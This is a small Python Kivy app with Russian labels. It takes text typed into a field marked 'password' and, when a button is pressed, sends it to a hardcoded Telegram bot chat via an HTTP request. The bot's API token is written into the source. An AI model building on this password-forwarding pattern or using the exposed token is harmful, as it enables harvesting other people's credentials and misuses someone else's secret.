from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
import requests


class My(App):
    def __init__(self):
        super().__init__()
        self.input = TextInput(hint_text="Пароль", multiline=False)
        self.button = Button(text="Кнопочка")
        self.button.bind(on_press=self.from_input)
        self.label = Label(text="Информация:\n")

    def from_input(self, *args):
        data = self.input.text
        self.info("Считывается текст...")
        if data != '':
            self.info(f"Не пустое сообщение ('{data}') --- отправка...")
            requests.get(
                f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/sendMessage?chat_id"
                f"=888281527&text={data}")
            self.info("отправлено\n")
        else:
            self.info("Пустое сообщение\n")

    def info(self, texte):
        self.label.text = self.label.text + "\n" + texte

    def build(self):
        box = BoxLayout(orientation='vertical')
        box.add_widget(self.label)
        box.add_widget(self.input)
        box.add_widget(self.button)
        return box


if __name__ == '__main__':
    My().run()
